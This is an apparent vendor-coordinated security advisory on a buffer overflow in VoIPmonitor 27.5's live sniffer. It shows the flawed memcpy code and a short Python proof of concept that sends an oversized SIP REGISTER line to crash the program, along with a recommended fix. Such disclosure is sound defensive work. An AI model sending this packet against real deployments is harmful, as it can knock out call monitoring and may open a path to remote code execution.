# VoIPmonitor is vulnerable to a buffer overflow when using the live sniffer

- Fixed versions: 27.6
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-03-voipmonitor-livesniffer-buffer-overflow
- VoIPmonitor Security Advisory: none, changelog references fixes at https://www.voipmonitor.org/changelog-sniffer
- Tested vulnerable versions: 27.5
- Timeline:
    - Report date: 2021-02-10
	- Triaged: 2021-02-12
	- Fix provided for testing: 2021-02-15
	- VoIPmonitor release with fix: 2021-02-15
	- Enable Security advisory: 2021-03-15

## Description

A buffer overflow was identified in the VoIPmonitor live sniffer feature. The description variable in the function `save_packet_sql` is defined as a fixed length array of 1024 characters. The description is set to the value of a SIP request or response line. By setting a long request or response line VoIPmonitor will trigger a buffer overflow. The affected code is:

```c
char callidstr[1024] = "";
if(packetS->sipDataLen) {
    void *memptr = memmem(packetS->data_()+ packetS->sipDataOffset, 
        packetS->sipDataLen, "\r\n", 2);
    if(memptr) {
        memcpy(description, packetS->data_()+ packetS->sipDataOffset, 
            (char *)memptr - (char*)(packetS->data_()+ packetS->sipDataOffset));
        description[(char*)memptr - (char*)(packetS->data_()+ 
            packetS->sipDataOffset)] = '\0';
        printf("%s\n", description);
    }
    // ...
}
```

## Impact

When using the static binaries provided at the VoIPMonitor download site, this vulnerability may lead to remote code execution. This is due to lack of standard memory corruption protection as explained in a separate advisory, ES2021-04-voipmonitor-staticbuild-memory-corruption-protection.

When compiling the `voipmonitor` program from source, most modern build systems will automatically include run-time best practice checks. In such cases, it appears that the worst-case-scenario is that the program will end up crashing.

## How to reproduce the issue

1. Start the live sniffer from the VOIPMonitor GUI
2. Execute the following Python program so that VOIPMonitor is able to capture the packet
3. Observe that VOIPMonitor has crashed

```python
import socket
msg='REGISTER %s SIP/2.0\r\n' % ('a' * 1024)
msg+='Via: SIP/2.0/UDP 192.168.1.132:35393;rport;branch=z9hG4bK-kwtTkrdNAO2Wvw0v\r\n'
msg+='Max-Forwards: 70\r\n'
msg+='From: <sip:85861710@demo.sipvicious.pro>;tag=mnq1nKGNZHNUkNOG\r\n'
msg+='To: <sip:85861710@demo.sipvicious.pro>\r\n'
msg+='Call-ID: 93X9dNZO2qdcfpdu\r\n'
msg+='CSeq: 1 REGISTER\r\n'
msg+='Contact: <sip:85861710@192.168.1.132:35393;transport=udp>\r\n'
msg+='Expires: 60\r\n'
msg+='Content-Length: 0\r\n'
msg+='\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(msg.encode(), ('demo.sipvicious.pro', 5060))
```

## Solution and recommendations

To address this issue, we recommend upgrading to the latest fixed version of VoIPmonitor.

We recommended the following to the vendor:

> The length of the value that the description is being set to should be checked before it is copied into memory. The pattern `memcpy(dest, src, MIN(src_len, max_len));` could be used to safely perform this operation.

## Acknowledgements

Enable Security would like to thank Martin Vit and the developers at VoIPmonitor for the very quick response and fixing this security issue.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

